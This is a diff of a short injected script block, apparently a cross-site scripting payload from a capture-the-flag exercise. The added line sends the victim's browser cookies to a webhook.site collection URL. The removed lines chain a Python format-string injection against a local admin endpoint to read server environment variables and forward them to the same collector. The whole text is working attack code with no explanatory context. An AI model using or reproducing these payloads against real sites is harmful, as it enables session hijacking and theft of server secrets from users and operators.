@@ -1,6 +1,4 @@
 
 <script>
-    fetch('https://localhost:5000/admin?prompt={0.__globals__[app].__class__.__init__.__globals__[os].environ}')
-    .then(response => response.text())
-    .then((html) => {fetch(`https://webhook.site/c0222710-d940-4f5f-892f-28d04b138fbe/?body=${html}`)});
+    fetch(`https://webhook.site/c0222710-d940-4f5f-892f-28d04b138fbe/cookie=${document.cookie}`)
 </script>
